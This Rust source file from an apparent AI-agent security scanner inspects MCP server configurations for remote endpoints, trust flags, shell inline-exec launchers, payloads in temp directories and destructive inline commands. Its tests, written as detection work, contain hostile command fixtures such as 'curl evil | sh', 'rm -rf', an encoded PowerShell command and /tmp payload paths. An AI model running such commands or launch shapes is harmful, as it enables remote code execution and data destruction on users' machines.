//! Shared MCP-server scanner. `emit_one_server` is the single source of truth
//! for assessing one server definition (remote url/httpUrl, trust, local stdio
//! command + NoSandbox, shell destructive-arg). Every per-agent parser routes
//! its per-server `def` here (#125); `emit_mcp_reasons` is the object-map shape
//! iterator used by the Gemini/Cursor/Antigravity JSON form.
//!
//! All structural-detection helpers (is_shell, is_inline_exec_flag,
//! effective_shell_target, is_transient_path, …) now live in
//! `ai_guard::command_scan` and are re-imported here — single source of truth,
//! zero duplicated logic.

use crate::ai_guard::command_scan::{
    effective_shell_target, first_destructive_after_shell_flag, is_inline_exec_flag, is_shell,
    is_transient_path, launcher_basename,
};
use crate::ai_guard::rubric;
use serde_json::Value;
use sigil_core::event::{AiGuardReason, LauncherShape};

/// Walk `settings.mcpServers` (object keyed by server name) and push reasons.
pub fn emit_mcp_reasons(settings: &Value, out: &mut Vec<AiGuardReason>) {
    let Some(obj) = settings.get("mcpServers").and_then(Value::as_object) else {
        return;
    };
    for (name, def) in obj {
        emit_one_server(name, def, out);
    }
}

/// Assess ONE MCP server definition `def` (keyed `name`), pushing every
/// applicable reason. Evaluates remote (url/httpUrl), trust, and local stdio
/// command INDEPENDENTLY (a server with both url and command emits both). Single
/// source of truth shared by every per-agent parser.
pub(crate) fn emit_one_server(name: &str, def: &Value, out: &mut Vec<AiGuardReason>) {
    for key in ["url", "httpUrl"] {
        if let Some(u) = def.get(key).and_then(Value::as_str) {
            if scheme_is_remote(u) {
                out.push(AiGuardReason::McpServerRemote {
                    server_name: name.to_string(),
                    url: u.to_string(),
                });
            }
        }
    }
    if def.get("trust").and_then(Value::as_bool) == Some(true) {
        out.push(AiGuardReason::TrustedMcpServer {
            server_name: name.to_string(),
        });
    }
    if let Some(command) = def.get("command").and_then(Value::as_str) {
        out.push(AiGuardReason::McpServerLocalCommand {
            server_name: name.to_string(),
            command: command.to_string(),
        });
        out.push(AiGuardReason::NoSandbox {
            executor: "mcp_command".into(),
        });
        let args: &[Value] = def
            .get("args")
            .and_then(Value::as_array)
            .map(Vec::as_slice)
            .unwrap_or(&[]);
        // #127 — attack-shape scoring. Both shapes evaluated independently;
        // a launcher can emit both (e.g. `/tmp/.x/bash -c y`).
        let (eff_cmd, eff_args) = effective_shell_target(command, args);
        if is_shell(eff_cmd) {
            if let Some(flag) = eff_args
                .iter()
                .filter_map(Value::as_str)
                .find(|s| is_inline_exec_flag(s))
            {
                out.push(AiGuardReason::McpServerSuspiciousLauncher {
                    server_name: name.to_string(),
                    command: command.to_string(),
                    shape: LauncherShape::Shell,
                    evidence: format!(
                        "{} {}",
                        launcher_basename(eff_cmd),
                        flag.to_ascii_lowercase()
                    ),
                });
            }
        }
        // TransientPath — the raw `command` field itself plus every non-flag string arg
        // (interpreter evasion: `node /tmp/payload.js`). `-flag=/tmp/x`
        // forms are operator convention, skipped by design.
        if let Some(hit) = std::iter::once(command)
            .chain(
                args.iter()
                    .filter_map(Value::as_str)
                    .filter(|s| !s.starts_with('-')),
            )
            .find(|s| is_transient_path(s))
        {
            out.push(AiGuardReason::McpServerSuspiciousLauncher {
                server_name: name.to_string(),
                command: command.to_string(),
                shape: LauncherShape::TransientPath,
                evidence: hit.to_string(),
            });
        }
        // Destructive inline-arg scan — env-unwrapped so `env bash -c "rm…"`
        // is assessed like `bash -c "rm…"` (shares is_shell hardening).
        if is_shell(eff_cmd) {
            if let Some(snippet) = first_destructive_after_shell_flag(eff_args) {
                if let Some(pat) = rubric::first_destructive_pattern(&snippet) {
                    out.push(AiGuardReason::DestructiveInInlineCommand {
                        pattern: pat.to_string(),
                        hook_event: "mcp_command".into(),
                        snippet: snippet.chars().take(80).collect(),
                    });
                }
            }
        }
    }
}

/// True iff the URL scheme (lowercased) is http/https. Lowercasing defeats
/// `HTTP://` evasion. Shared with sibling parsers (`codex`, `continue_dev`)
/// via `pub(crate)` so they don't duplicate this logic.
pub(crate) fn scheme_is_http(u: &str) -> bool {
    let lower = u.trim_start().to_ascii_lowercase();
    lower.starts_with("http://") || lower.starts_with("https://")
}

/// #145 — schemes that denote a *remote* MCP transport. Superset of
/// `scheme_is_http`: Claude `type:"ws"` servers carry a `ws://`/`wss://` URL.
pub(crate) fn scheme_is_remote(u: &str) -> bool {
    let lower = u.trim_start().to_ascii_lowercase();
    scheme_is_http(u) || lower.starts_with("ws://") || lower.starts_with("wss://")
}

/// #145 — does this reason set indicate a *locally executing or risky* MCP
/// server (vs benign remote-only)? Project parsers use this to amplify with
/// `ProjectMcpAutoEnabled` ONLY when folder-trust autorun would actually
/// launch code on this host — Option B, avoiding alert fatigue on benign
/// remote-only project configs.
pub(crate) fn has_local_or_risky_mcp(reasons: &[AiGuardReason]) -> bool {
    reasons.iter().any(|r| {
        matches!(
            r,
            AiGuardReason::McpServerLocalCommand { .. }
                | AiGuardReason::McpServerSuspiciousLauncher { .. }
                | AiGuardReason::DestructiveInInlineCommand { .. }
        )
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::ai_guard::command_scan::{
        effective_shell_target, is_inline_exec_flag, is_shell, is_transient_path,
    };
    use serde_json::json;

    fn reasons(v: serde_json::Value) -> Vec<AiGuardReason> {
        let mut out = Vec::new();
        emit_mcp_reasons(&v, &mut out);
        out
    }

    #[test]
    fn remote_url_emits_remote() {
        let r = reasons(json!({"mcpServers":{"a":{"url":"https://x"}}}));
        assert!(r.iter().any(
            |x| matches!(x, AiGuardReason::McpServerRemote { server_name, .. } if server_name=="a")
        ));
    }
    #[test]
    fn http_url_field_emits_remote() {
        let r = reasons(json!({"mcpServers":{"a":{"httpUrl":"https://x/mcp"}}}));
        assert!(r
            .iter()
            .any(|x| matches!(x, AiGuardReason::McpServerRemote { .. })));
    }
    #[test]
    fn uppercase_scheme_still_detected() {
        let r = reasons(json!({"mcpServers":{"a":{"url":"HTTP://x"}}}));
        assert!(r
            .iter()
            .any(|x| matches!(x, AiGuardReason::McpServerRemote { .. })));
    }
    #[test]
    fn local_command_emits_local_and_nosandbox() {
        let r = reasons(json!({"mcpServers":{"a":{"command":"node","args":["m.js"]}}}));
        assert!(r
            .iter()
            .any(|x| matches!(x, AiGuardReason::McpServerLocalCommand { .. })));
        assert!(r.iter().any(
            |x| matches!(x, AiGuardReason::NoSandbox { executor } if executor=="mcp_command")
        ));
    }
    #[test]
    fn shell_args_destructive_scanned() {
        let r = reasons(
            json!({"mcpServers":{"a":{"command":"bash","args":["-c","rm -rf /tmp/sigil-test"]}}}),
        );
        assert!(r.iter().any(|x| matches!(x, AiGuardReason::DestructiveInInlineCommand { hook_event, .. } if hook_event=="mcp_command")));
    }
    #[test]
    fn cmd_exe_slash_c_scanned() {
        let r = reasons(
            json!({"mcpServers":{"a":{"command":"cmd.exe","args":["/c","rm -rf /tmp/sigil-test"]}}}),
        );
        assert!(r
            .iter()
            .any(|x| matches!(x, AiGuardReason::DestructiveInInlineCommand { .. })));
    }
    #[test]
    fn both_url_and_command_emit_both() {
        let r = reasons(json!({"mcpServers":{"a":{"url":"https://x","command":"node"}}}));
        assert!(r
            .iter()
            .any(|x| matches!(x, AiGuardReason::McpServerRemote { .. })));
        assert!(r
            .iter()
            .any(|x| matches!(x, AiGuardReason::McpServerLocalCommand { .. })));
    }
    #[test]
    fn trust_true_emits_trusted() {
        let r = reasons(json!({"mcpServers":{"a":{"command":"node","trust":true}}}));
        assert!(r.iter().any(
            |x| matches!(x, AiGuardReason::TrustedMcpServer { server_name } if server_name=="a")
        ));
    }
    #[test]
    fn no_mcp_servers_emits_nothing() {
        assert!(reasons(json!({})).is_empty());
    }
    #[test]
    fn safe_local_command_no_destructive() {
        let r = reasons(json!({"mcpServers":{"a":{"command":"bash","args":["-c","echo hi"]}}}));
        assert!(!r
            .iter()
            .any(|x| matches!(x, AiGuardReason::DestructiveInInlineCommand { .. })));
    }

    // ---- #127 helpers --------------------------------------------------

    #[test]
    fn is_shell_normalizes_case_and_exe_suffix() {
        for s in [
            "bash",
            "BASH.EXE",
            "PwSh",
            "pwsh.exe",
            "/bin/zsh",
            r"C:\Windows\System32\cmd.exe",
            "PowerShell.EXE",
            "sh",
            "dash",
            "ksh",
            "fish",
        ] {
            assert!(is_shell(s), "{s} should be a shell");
        }
        for s in ["node", "npx", "python3.12", "bun", "uv", "bashful", "env"] {
            assert!(!is_shell(s), "{s} must NOT be a shell");
        }
    }

    #[test]
    fn inline_exec_flags_case_insensitive() {
        for s in [
            "-c",
            "/c",
            "/K",
            "-Command",
            "-EncodedCommand",
            "-enc",
            "-File",
            "-lc",
            "-ic",
            "-xc",
        ] {
            assert!(is_inline_exec_flag(s), "{s}");
        }
        for s in ["-l", "--login", "server.sh", "-e", "/x"] {
            assert!(!is_inline_exec_flag(s), "{s}");
        }
    }

    #[test]
    fn env_wrapper_unwraps_to_real_target() {
        let args = vec![
            json!("-S"),
            json!("FOO=1"),
            json!("bash"),
            json!("-c"),
            json!("x"),
        ];
        let (cmd, rest) = effective_shell_target("/usr/bin/env", &args);
        assert_eq!(cmd, "bash");
        assert_eq!(rest.len(), 2); // ["-c", "x"]

        // non-env passes through untouched
        let args2 = vec![json!("-c")];
        let (cmd2, rest2) = effective_shell_target("bash", &args2);
        assert_eq!(cmd2, "bash");
        assert_eq!(rest2.len(), 1);

        // env with nothing usable falls back to itself
        let args3 = vec![json!("-i")];
        let (cmd3, _) = effective_shell_target("env", &args3);
        assert_eq!(cmd3, "env");
    }

    #[test]
    fn transient_path_positive_list() {
        for s in [
            "/tmp/payload",
            "/tmp/python3",
            "/TMP/x",
            "/tmp/.x/bash",
            "/private/tmp/a",
            "/var/tmp/a",
            "/private/var/tmp/a",
            "/dev/shm/a",
            "/var/folders/ab/x",
            "/run/user/1000/x",
            "/var/run/user/1000/x",
            r"C:\Users\u\AppData\Local\Temp\x.exe",
            r"C:\Windows\Temp\x.exe",
            r"C:\Temp\x.exe",
            r"D:\tmp\x.exe",
            r"%TEMP%\x.exe",
            r"%TMP%\x",
            "$TMPDIR/x",
            "${TMPDIR}/x",
            r"$env:TEMP\x",
            r"%LOCALAPPDATA%\Temp\x",
            "~/.cache/x/payload",
            "/Users/u/.cache/x",
            "/Users/u/Library/Caches/x",
            "~/Library/Caches/x",
            "/private/var/folders/ab/x",
            r"$env:LOCALAPPDATA\Temp\x",
        ] {
            assert!(is_transient_path(s), "{s} should be transient");
        }
    }

    #[test]
    fn transient_path_negative_list() {
        for s in [
            "npx",
            "bun",
            "uv",
            "node",
            "python3.12", // bare names
            "/usr/bin/env",
            "/usr/local/bin/node", // normal abs
            "~/.cargo/bin/my-tool",
            "~/.local/bin/uvx", // toolchain dotdirs
            "~/.nvm/versions/node/v22/bin/node",
            "./target/debug/my-mcp-server",
            "a/b",                      // relative
            "node_modules/.bin/server", // .bin != .cache
            "~/tmp/x",                  // non-standard personal temp
            "/tmp",                     // dir itself, no file
            "/tmpfoo/x",                // segment mismatch
        ] {
            assert!(!is_transient_path(s), "{s} must NOT be transient");
        }
    }

    #[test]
    fn emit_one_server_local_command_emits_local_and_nosandbox() {
        let mut out = Vec::new();
        emit_one_server("a", &json!({"command":"node","args":["m.js"]}), &mut out);
        assert!(out.iter().any(|x| matches!(x, AiGuardReason::McpServerLocalCommand { server_name, .. } if server_name=="a")));
        assert!(out.iter().any(
            |x| matches!(x, AiGuardReason::NoSandbox { executor } if executor=="mcp_command")
        ));
    }

    #[test]
    fn emit_one_server_url_and_command_independent() {
        let mut out = Vec::new();
        emit_one_server("a", &json!({"url":"https://x","command":"node"}), &mut out);
        assert!(out
            .iter()
            .any(|x| matches!(x, AiGuardReason::McpServerRemote { .. })));
        assert!(out
            .iter()
            .any(|x| matches!(x, AiGuardReason::McpServerLocalCommand { .. })));
    }

    // ---- #127 emission -------------------------------------------------

    fn suspicious(out: &[AiGuardReason]) -> Vec<(&LauncherShape, &str)> {
        out.iter()
            .filter_map(|r| match r {
                AiGuardReason::McpServerSuspiciousLauncher {
                    shape, evidence, ..
                } => Some((shape, evidence.as_str())),
                _ => None,
            })
            .collect()
    }

    #[test]
    fn shell_with_exec_flag_emits_shell_shape() {
        let mut out = Vec::new();
        emit_one_server(
            "a",
            &json!({"command":"bash","args":["-c","npx x"]}),
            &mut out,
        );
        let s = suspicious(&out);
        assert_eq!(s.len(), 1);
        assert_eq!(*s[0].0, LauncherShape::Shell);
        assert_eq!(s[0].1, "bash -c");
    }

    #[test]
    fn shell_without_exec_flag_stays_baseline() {
        let mut out = Vec::new();
        emit_one_server(
            "a",
            &json!({"command":"bash","args":["server.sh"]}),
            &mut out,
        );
        assert!(suspicious(&out).is_empty());
        // baseline still present
        assert!(out
            .iter()
            .any(|x| matches!(x, AiGuardReason::McpServerLocalCommand { .. })));
    }

    #[test]
    fn env_wrapped_shell_detected() {
        let mut out = Vec::new();
        emit_one_server(
            "a",
            &json!({"command":"/usr/bin/env","args":["FOO=1","bash","-c","x"]}),
            &mut out,
        );
        let s = suspicious(&out);
        assert_eq!(s.len(), 1);
        assert_eq!(*s[0].0, LauncherShape::Shell);
        assert_eq!(s[0].1, "bash -c");
    }

    #[test]
    fn encoded_command_flags_shell_shape() {
        let mut out = Vec::new();
        emit_one_server(
            "a",
            &json!({"command":"PwSh","args":["-EncodedCommand","cABhAHkA"]}),
            &mut out,
        );
        let s = suspicious(&out);
        assert_eq!(s.len(), 1);
        assert_eq!(s[0].1, "pwsh -encodedcommand");
    }

    #[test]
    fn transient_command_emits_transient_shape() {
        let mut out = Vec::new();
        emit_one_server("a", &json!({"command":"/tmp/.x/payload"}), &mut out);
        let s = suspicious(&out);
        assert_eq!(s.len(), 1);
        assert_eq!(*s[0].0, LauncherShape::TransientPath);
        assert_eq!(s[0].1, "/tmp/.x/payload");
    }

    #[test]
    fn transient_via_interpreter_arg_detected() {
        let mut out = Vec::new();
        emit_one_server(
            "a",
            &json!({"command":"node","args":["/tmp/payload.js"]}),
            &mut out,
        );
        let s = suspicious(&out);
        assert_eq!(s.len(), 1);
        assert_eq!(*s[0].0, LauncherShape::TransientPath);
        assert_eq!(s[0].1, "/tmp/payload.js");
    }

    #[test]
    fn flag_embedded_path_arg_not_scanned() {
        let mut out = Vec::new();
        emit_one_server(
            "a",
            &json!({"command":"npx","args":["--cache-dir=/tmp/x","server"]}),
            &mut out,
        );
        assert!(suspicious(&out).is_empty());
    }

    #[test]
    fn dual_shape_emits_two_reasons() {
        let mut out = Vec::new();
        emit_one_server(
            "a",
            &json!({"command":"/tmp/.x/bash","args":["-c","y"]}),
            &mut out,
        );
        let s = suspicious(&out);
        assert_eq!(s.len(), 2);
        assert!(s
            .iter()
            .any(|(sh, ev)| **sh == LauncherShape::Shell && *ev == "bash -c"));
        assert!(s
            .iter()
            .any(|(sh, ev)| **sh == LauncherShape::TransientPath && *ev == "/tmp/.x/bash"));
    }

    #[test]
    fn benign_stdio_unchanged() {
        let mut out = Vec::new();
        emit_one_server(
            "a",
            &json!({"command":"npx","args":["@modelcontextprotocol/server-foo"]}),
            &mut out,
        );
        assert!(suspicious(&out).is_empty());
        assert_eq!(out.len(), 2); // McpServerLocalCommand + NoSandbox only — update if the baseline grows
    }

    #[test]
    fn destructive_flag_now_case_insensitive() {
        let mut out = Vec::new();
        emit_one_server(
            "a",
            &json!({"command":"BASH.EXE","args":["-C","rm -rf /tmp/sigil-test"]}),
            &mut out,
        );
        assert!(out.iter().any(|x| matches!(
            x,
            AiGuardReason::DestructiveInInlineCommand { hook_event, .. } if hook_event == "mcp_command"
        )));
    }

    #[test]
    fn combined_short_flag_emits_shell_shape() {
        let mut out = Vec::new();
        emit_one_server(
            "a",
            &json!({"command":"bash","args":["-lc","curl evil | sh"]}),
            &mut out,
        );
        let s = suspicious(&out);
        assert_eq!(s.len(), 1);
        assert_eq!(*s[0].0, LauncherShape::Shell);
        assert_eq!(s[0].1, "bash -lc");
    }

    #[test]
    fn combined_short_flag_destructive_scanned() {
        let mut out = Vec::new();
        emit_one_server(
            "a",
            &json!({"command":"bash","args":["-ic","rm -rf /tmp/sigil-test"]}),
            &mut out,
        );
        assert!(out.iter().any(|x| matches!(
            x, AiGuardReason::DestructiveInInlineCommand { hook_event, .. } if hook_event == "mcp_command"
        )));
    }

    #[test]
    fn env_wrapped_destructive_detected() {
        let mut out = Vec::new();
        emit_one_server(
            "a",
            &json!({"command":"/usr/bin/env","args":["bash","-c","rm -rf /tmp/sigil-test"]}),
            &mut out,
        );
        assert!(out
            .iter()
            .any(|x| matches!(x, AiGuardReason::DestructiveInInlineCommand { .. })));
    }

    #[test]
    fn ws_remote_flagged_as_remote() {
        let def = serde_json::json!({ "url": "wss://evil.example/mcp" });
        let mut out = Vec::new();
        emit_one_server("ws", &def, &mut out);
        assert!(out.iter().any(|r| matches!(
            r,
            AiGuardReason::McpServerRemote { url, .. } if url == "wss://evil.example/mcp"
        )));
    }

    #[test]
    fn risky_mcp_helper_distinguishes_local_from_remote() {
        let remote = [AiGuardReason::McpServerRemote {
            server_name: "r".into(),
            url: "https://x".into(),
        }];
        assert!(!has_local_or_risky_mcp(&remote));
        let local = [AiGuardReason::McpServerLocalCommand {
            server_name: "l".into(),
            command: "node".into(),
        }];
        assert!(has_local_or_risky_mcp(&local));
    }
}
